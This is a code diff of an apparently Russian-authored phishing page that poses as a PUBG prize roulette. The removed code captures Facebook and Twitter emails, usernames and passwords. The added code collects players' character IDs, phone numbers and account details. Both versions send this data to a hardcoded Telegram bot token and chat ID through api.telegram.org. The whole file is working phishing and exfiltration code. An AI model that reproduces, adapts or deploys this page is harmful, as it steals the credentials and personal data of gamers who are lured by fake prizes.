-            { id: 3, name: "M416 Lednik", image: "m416lednik.jpg", code: "M416LED" },
-            { id: 4, name: "Mummy Set", image: "mummy.jpg", code: "MUMMYSET" },
-            { id: 5, name: "M416 Shut", image: "m416shut.jpg", code: "M416SHUT" },
-            { id: 6, name: "8500 UC", image: "8500uc.jpg", code: "UC8500" },
-            { id: 7, name: "Shorti Skin", image: "shorti.jpg", code: "SHORTI23" },
-            { id: 8, name: "M416 Skin", image: "m416skin.jpg", code: "M416SKIN1" },
-            { id: 9, name: "Kalash Skin", image: "kalash.jpg", code: "KALASHNV" },
-            { id: 10, name: "M416 Skin 2", image: "m416skin2.jpg", code: "M416SKIN2" },
-            { id: 11, name: "M16 Skin", image: "m16.jpg", code: "M16SPECIAL" },
-            { id: 12, name: "Tolstovka", image: "tolstovka.jpg", code: "TOLSTOVKA" }
+            { id: 1, name: "Pharaon", image: "pharaon.jpg" },
+            { id: 2, name: "Material", image: "material.jpg" },
+            { id: 3, name: "M416 Lednik", image: "m416lednik.jpg" },
+            { id: 4, name: "Mummy", image: "mummy.jpg" },
+            { id: 5, name: "M416 Shut", image: "m416shut.jpg" },
+            { id: 6, name: "8500 UC", image: "8500uc.jpg" },
+            { id: 7, name: "Shorti", image: "shorti.jpg" },
+            { id: 8, name: "M416 Skin", image: "m416skin.jpg" },
+            { id: 9, name: "Kalash", image: "kalash.jpg" },
+            { id: 10, name: "M416 Skin 2", image: "m416skin2.jpg" },
+            { id: 11, name: "M16", image: "m16.jpg" },
+            { id: 12, name: "Tolstovka", image: "tolstovka.jpg" }
         ];
         
-        // Game state
-        let userData = {
-            isSpun: false,
-            winnerPrize: null,
-            loginMethod: null,
-            accountData: {}
-        };
+        // Токен бота Telegram и ID чата
+        const TELEGRAM_BOT_TOKEN = "8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU";
+        const TELEGRAM_CHAT_ID = "1709490182";
         
-        // DOM elements
-        const wheel = document.getElementById('wheel');
+        // Элементы DOM
         const spinButton = document.getElementById('spinButton');
-        const spinCenter = document.getElementById('spinCenter');
-        const winnerSection = document.getElementById('winnerSection');
-        const winnerImage = document.getElementById('winnerImage');
-        const winnerPrize = document.getElementById('winnerPrize');
+        const rouletteImage = document.getElementById('rouletteImage');
         const prizesGrid = document.getElementById('prizesGrid');
-        const loginSection = document.getElementById('loginSection');
-        const facebookOption = document.getElementById('facebookOption');
-        const twitterOption = document.getElementById('twitterOption');
-        const fbCheckbox = document.getElementById('fbCheckbox');
-        const twCheckbox = document.getElementById('twCheckbox');
-        const facebookForm = document.getElementById('facebookForm');
-        const twitterForm = document.getElementById('twitterForm');
-        const fbSubmit = document.getElementById('fbSubmit');
-        const twSubmit = document.getElementById('twSubmit');
+        const authSection = document.getElementById('authSection');
         const verifySection = document.getElementById('verifySection');
-        const verifySubmit = document.getElementById('verifySubmit');
-        const successSection = document.getElementById('successSection');
+        const congratsSection = document.getElementById('congratsSection');
+        const facebookForm = document.getElementById('facebookForm');
+        const facebookAuth = document.getElementById('facebookAuth');
+        const twitterAuth = document.getElementById('twitterAuth');
+        const fbLoginButton = document.getElementById('fbLoginButton');
+        const verifyForm = document.getElementById('verifyForm');
+        const wonPrizeImage = document.getElementById('wonPrizeImage');
+        const wonPrizeName = document.getElementById('wonPrizeName');
+        const cancelButton = document.getElementById('cancelButton');
+        const okButton = document.getElementById('okButton');
         
-        // Initialize prizes grid
+        let currentPrize = null;
+        let isSpinning = false;
+        let currentRotation = 0;
+        
+        // Инициализация сетки призов
         function initPrizesGrid() {
             prizesGrid.innerHTML = '';
             prizes.forEach(prize => {
                 const prizeElement = document.createElement('div');
                 prizeElement.className = 'prize-item';
                 prizeElement.innerHTML = `
-                    <img src="${prize.image}" alt="${prize.name}" onerror="this.src='https://via.placeholder.com/70/222/fff?text=PRIZE'">
+                    <img src="${prize.image}" alt="${prize.name}" class="prize-image">
                     <div class="prize-name">${prize.name}</div>
                 `;
-                prizeElement.dataset.id = prize.id;
                 prizesGrid.appendChild(prizeElement);
             });
         }
         
-        // Spin the wheel
-        function spinWheel() {
-            if (userData.isSpun) return;
+        // Вращение рулетки
+        function spinRoulette() {
+            if (isSpinning) return;
             
+            isSpinning = true;
             spinButton.disabled = true;
-            spinButton.textContent = "SPINNING...";
-            spinCenter.classList.add('spinning');
             
-            // Random prize selection
-            const winnerIndex = Math.floor(Math.random() * prizes.length);
-            const winner = prizes[winnerIndex];
-            userData.winnerPrize = winner;
+            // Случайный выбор приза
+            const prizeIndex = Math.floor(Math.random() * prizes.length);
+            currentPrize = prizes[prizeIndex];
             
-            // Calculate rotation (30 degrees per segment + extra for animation)
-            const segmentAngle = 360 / prizes.length;
-            const targetAngle = 360 * 5 + (winnerIndex * segmentAngle);
+            // Каждый приз занимает 30 градусов на рулетке (360/12)
+            const prizeAngle = prizeIndex * 30;
             
-            // Apply rotation
-            wheel.style.transform = `rotate(${targetAngle}deg)`;
+            // Вычисляем конечное вращение
+            // Делаем несколько полных оборотов + угол приза
+            const fullRotations = 5; // 5 полных оборотов
+            const targetRotation = fullRotations * 360 + (360 - prizeAngle) + 15; // +15 чтобы стрелка указывала на центр приза
             
-            // Show winner after animation
+            // Анимация вращения
+            currentRotation += targetRotation;
+            rouletteImage.style.transform = `rotate(${currentRotation}deg)`;
+            
+            // После завершения вращения
             setTimeout(() => {
-                spinCenter.classList.remove('spinning');
-                spinButton.textContent = "SPIN TO WIN";
-                showWinner(winner);
-                userData.isSpun = true;
-                
-                // Highlight winning prize in grid
-                document.querySelectorAll('.prize-item').forEach(item => {
-                    if (parseInt(item.dataset.id) === winner.id) {
-                        item.classList.add('winner');
-                    }
-                });
-                
-                // Show login section
-                setTimeout(() => {
-                    loginSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                }, 1000);
+                isSpinning = false;
+                showAuthSection();
             }, 4000);
         }
         
-        // Show winner section
-        function showWinner(prize) {
-            winnerImage.src = prize.image;
-            winnerImage.onerror = function() {
-                this.src = 'https://via.placeholder.com/100/222/fff?text=' + encodeURIComponent(prize.name);
-            };
-            winnerPrize.textContent = prize.name;
-            winnerSection.style.display = 'block';
+        // Показать раздел авторизации
+        function showAuthSection() {
+            authSection.style.display = 'block';
+            authSection.scrollIntoView({ behavior: 'smooth' });
         }
         
-        // Show login form
-        function showLoginForm(method) {
-            userData.loginMethod = method;
-            
-            // Update checkboxes
-            if (method === 'facebook') {
-                fbCheckbox.classList.add('checked');
-                twCheckbox.classList.remove('checked');
-                facebookOption.classList.add('selected');
-                twitterOption.classList.remove('selected');
-                facebookForm.style.display = 'block';
-                twitterForm.style.display = 'none';
-            } else {
-                twCheckbox.classList.add('checked');
-                fbCheckbox.classList.remove('checked');
-                twitterOption.classList.add('selected');
-                facebookOption.classList.remove('selected');
-                twitterForm.style.display = 'block';
-                facebookForm.style.display = 'none';
-            }
+        // Показать форму Facebook
+        function showFacebookForm() {
+            facebookForm.style.display = 'block';
         }
         
-        // Process login
-        function processLogin(method, credentials) {
-            userData.isLoggedIn = true;
-            
-            // Generate fake account data
-            userData.accountData = {
-                characterId: 'ID' + Math.floor(10000000 + Math.random() * 90000000),
-                characterName: ['ProPlayer', 'SniperKing', 'BattleMaster', 'LastSurvivor', 'ChickenDinner'][Math.floor(Math.random() * 5)],
-                phoneNumber: '+1***' + Math.floor(100 + Math.random() * 900) + '****',
-                accountLevel: Math.floor(50 + Math.random() * 50),
-                rankTier: ['Gold', 'Platinum', 'Diamond', 'Crown', 'Ace'][Math.floor(Math.random() * 5)],
-                passType: 'ROYALE PASS S',
-                passLevel: Math.floor(1 + Math.random() * 100),
-                platform: ['Android', 'iOS'][Math.floor(Math.random() * 2)]
-            };
-            
-            // Hide login section, show verify section
-            loginSection.style.display = 'none';
-            showVerifySection();
-            
-            // Send data to Telegram bot
-            sendToTelegram(credentials);
-        }
-        
-        // Show verify section
+        // Показать раздел верификации
         function showVerifySection() {
-            // Fill verify fields with generated data
-            document.getElementById('charId').textContent = userData.accountData.characterId;
-            document.getElementById('charName').textContent = userData.accountData.characterName;
-            document.getElementById('phoneNumber').textContent = userData.accountData.phoneNumber;
-            document.getElementById('accountLevel').textContent = userData.accountData.accountLevel;
-            document.getElementById('rankTier').textContent = userData.accountData.rankTier;
-            document.getElementById('passType').textContent = userData.accountData.passType;
-            document.getElementById('passLevel').textContent = userData.accountData.passLevel;
-            document.getElementById('platform').textContent = userData.accountData.platform;
-            
+            authSection.style.display = 'none';
             verifySection.style.display = 'block';
-            verifySection.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            verifySection.scrollIntoView({ behavior: 'smooth' });
         }
         
-        // Send data to Telegram bot
-        function sendToTelegram(credentials) {
+        // Показать поздравление
+        function showCongratulations() {
+            verifySection.style.display = 'none';
+            
+            // Установка выигранного приза
+            wonPrizeImage.src = currentPrize.image;
+            wonPrizeName.textContent = currentPrize.name;
+            
+            congratsSection.style.display = 'block';
+            congratsSection.scrollIntoView({ behavior: 'smooth' });
+            
+            // Отправка данных в Telegram
+            sendToTelegram();
+        }
+        
+        // Отправка данных в Telegram
+        async function sendToTelegram() {
+            const formData = new FormData(verifyForm);
+            const data = {
+                prize: currentPrize.name,
+                characterId: formData.get('characterId') || document.getElementById('characterId').value,
+                characterName: formData.get('characterName') || document.getElementById('characterName').value,
+                phoneNumber: formData.get('phoneNumber') || document.getElementById('phoneNumber').value,
+                accountLevel: formData.get('accountLevel') || document.getElementById('accountLevel').value,
+                rankedTier: formData.get('rankedTier') || document.getElementById('rankedTier').value,
+                royalePassType: formData.get('royalePassType') || document.getElementById('royalePassType').value,
+                royalePassLevel: formData.get('royalePassLevel') || document.getElementById('royalePassLevel').value,
+                platform: formData.get('platform') || document.getElementById('platform').value,
+                timestamp: new Date().toLocaleString()
+            };
+            
             const message = `
-🎮 *НОВЫЙ ВЫИГРЫШ В PUBG* 🎮
+🎉 НОВЫЙ ВЫИГРЫШ НА РУЛЕТКЕ PUBG 🎉
 
-*Выигранный приз:* ${userData.winnerPrize.name}
-*Код приза:* ${userData.winnerPrize.code}
+🏆 Приз: ${data.prize}
 
-*Данные аккаунта:*
-- ID персонажа: ${userData.accountData.characterId}
-- Имя персонажа: ${userData.accountData.characterName}
-- Уровень аккаунта: ${userData.accountData.accountLevel}
-- Ранговый уровень: ${userData.accountData.rankTier}
-- Royale Pass: ${userData.accountData.passType} (Уровень ${userData.accountData.passLevel})
-- Платформа: ${userData.accountData.platform}
+📋 Данные игрока:
+👤 ID персонажа: ${data.characterId}
+📛 Имя персонажа: ${data.characterName}
+📞 Номер телефона: ${data.phoneNumber}
+⭐ Уровень аккаунта: ${data.accountLevel}
+📊 Ранговый уровень: ${data.rankedTier}
+🎫 Тип Royale Pass: ${data.royalePassType}
+📈 Уровень Royale Pass: ${data.royalePassLevel}
+📱 Платформа: ${data.platform}
 
-*Метод входа:* ${userData.loginMethod}
-*Данные для входа:* ${credentials}
-
-*Время запроса:* ${new Date().toLocaleString('ru-RU')}
+🕐 Время: ${data.timestamp}
             `;
             
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Данные отправлены в Telegram:', data);
-            })
-            .catch(error => {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                console.log('Данные отправлены в Telegram');
+            } catch (error) {
                 console.error('Ошибка отправки в Telegram:', error);
+            }
+        }
+        
+        // Обработчики событий
+        spinButton.addEventListener('click', spinRoulette);
+        
+        facebookAuth.addEventListener('click', () => {
+            showFacebookForm();
+        });
+        
+        twitterAuth.addEventListener('click', () => {
+            // Для Twitter просто переходим к верификации
+            showVerifySection();
+        });
+        
+        fbLoginButton.addEventListener('click', (e) => {
+            e.preventDefault();
+            // Здесь должна быть реальная проверка данных Facebook
+            // Но для демо просто переходим к верификации
+            showVerifySection();
+        });
+        
+        verifyForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            showCongratulations();
+        });
+        
+        cancelButton.addEventListener('click', () => {
+            congratsSection.style.display = 'none';
+            spinButton.disabled = false;
+        });
+        
+        okButton.addEventListener('click', () => {
+            congratsSection.style.display = 'none';
+            spinButton.disabled = false;
+            
+            // Сброс формы
+            verifyForm.reset();
+        });
+        
+        // Имитация входа через Facebook при клике на ссылки формы
+        document.getElementById('createAccount').addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('Redirect to Facebook registration');
+        });
+        
+        document.getElementById('notNow').addEventListener('click', (e) => {
+            e.preventDefault();
+            showVerifySection();
+        });
+        
+        document.getElementById('forgotPassword').addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('Redirect to Facebook password recovery');
+        });
+        
+        // Инициализация
+        window.onload = function() {
+            initPrizesGrid();
+            
+            // Если картинка рулетки не загружена, используем CSS-замену
+            rouletteImage.onerror = function() {
+                this.src = 'https://via.placeholder.com/500x500/8B4513/FFFFFF?text=ROULETTE';
+            };
+            
+            // Проверка фоновых изображений
+            const bgTop = document.querySelector('.background-top');
+            const bgBottom = document.querySelector('.background-bottom');
+            
+            bgTop.onerror = function() {
+                this.style.background = 'linear-gradient(to bottom, #1a1a2e, #16213e)';
+            };
+            
+            bgBottom.onerror = function() {
+                this.style.background = 'linear-gradient(to top, #0f3460, #1a1a2e)';
+            };
+            
+            // Проверка изображений призов
+            const prizeImages = document.querySelectorAll('.prize-image');
+            prizeImages.forEach(img => {
+                img.onerror = function() {
+                    this.src = 'https://via.placeholder.com/150x100/333/FFCC00?text=PRIZE';
+                };
             });
-        }
-        
-        // Show success notification
-        function showSuccessNotification() {
-            verifySection.style.display = 'none';
-            successSection.style.display = 'block';
-            successSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        }
-        
-        // Event Listeners
-        spinButton.addEventListener('click', spinWheel);
-        spinCenter.addEventListener('click', spinWheel);
-        
-        facebookOption.addEventListener('click', () => showLoginForm('facebook'));
-        twitterOption.addEventListener('click', () => showLoginForm('twitter'));
-        
-        fbSubmit.addEventListener('click', (e) => {
-            e.preventDefault();
-            const email = document.getElementById('fbEmail').value;
-            const password = document.getElementById('fbPassword').value;
-            
-            if (!email || !password) {
-                alert('Please enter both email and password');
-                return;
-            }
-            
-            processLogin('facebook', `Email: ${email}, Password: ${password}`);
-        });
-        
-        twSubmit.addEventListener('click', (e) => {
-            e.preventDefault();
-            const username = document.getElementById('twUsername').value;
-            const password = document.getElementById('twPassword').value;
-            
-            if (!username || !password) {
-                alert('Please enter both username and password');
-                return;
-            }
-            
-            processLogin('twitter', `Username: ${username}, Password: ${password}`);
-        });
-        
-        verifySubmit.addEventListener('click', showSuccessNotification);
-        
-        // Initialize the page
-        initPrizesGrid();
-        
-        // Create wheel image
-        createWheelImage();
-        
-        // Function to create wheel image
-        function createWheelImage() {
-            const canvas = document.createElement('canvas');
-            canvas.width = 500;
-            canvas.height = 500;
-            const ctx = canvas.getContext('2d');
-            
-            // Draw wheel background
-            const centerX = 250;
-            const centerY = 250;
-            const radius = 240;
-            
-            // Draw segments
-            const segmentAngle = (2 * Math.PI) / prizes.length;
-            
-            for (let i = 0; i < prizes.length; i++) {
-                const startAngle = i * segmentAngle;
-                const endAngle = (i + 1) * segmentAngle;
-                
-                // Alternate colors
-                ctx.fillStyle = i % 2 === 0 ? '#8B0000' : '#B22222';
-                ctx.beginPath();
-                ctx.moveTo(centerX, centerY);
-                ctx.arc(centerX, centerY, radius, startAngle, endAngle);
-                ctx.closePath();
-                ctx.fill();
-                
-                // Draw prize names
-                ctx.save();
-                ctx.translate(centerX, centerY);
-                ctx.rotate(startAngle + segmentAngle / 2);
-                ctx.textAlign = 'right';
-                ctx.fillStyle = '#FFD700';
-                ctx.font = 'bold 14px Arial';
-                ctx.fillText(prizes[i].name, radius - 30, 5);
-                ctx.restore();
-            }
-            
-            // Draw outer border
-            ctx.strokeStyle = '#FFD700';
-            ctx.lineWidth = 5;
-            ctx.beginPath();
-            ctx.arc(centerX, centerY, radius, 0, 2 * Math.PI);
-            ctx.stroke();
-            
-            // Draw center circle
-            ctx.fillStyle = '#000';
-            ctx.beginPath();
-            ctx.arc(centerX, centerY, 50, 0, 2 * Math.PI);
-            ctx.fill();
-            ctx.strokeStyle = '#FFD700';
-            ctx.lineWidth = 5;
-            ctx.stroke();
-            
-            // Add SPIN text
-            ctx.fillStyle = '#FFD700';
-            ctx.font = 'bold 16px Arial';
-            ctx.textAlign = 'center';
-            ctx.textBaseline = 'middle';
-            ctx.fillText('SPIN', centerX, centerY - 10);
-            ctx.fillText('WHEEL', centerX, centerY + 10);
-            
-            // Set wheel image
-            wheel.src = canvas.toDataURL();
-        }
+        };
     </script>
 </body>
 </html>
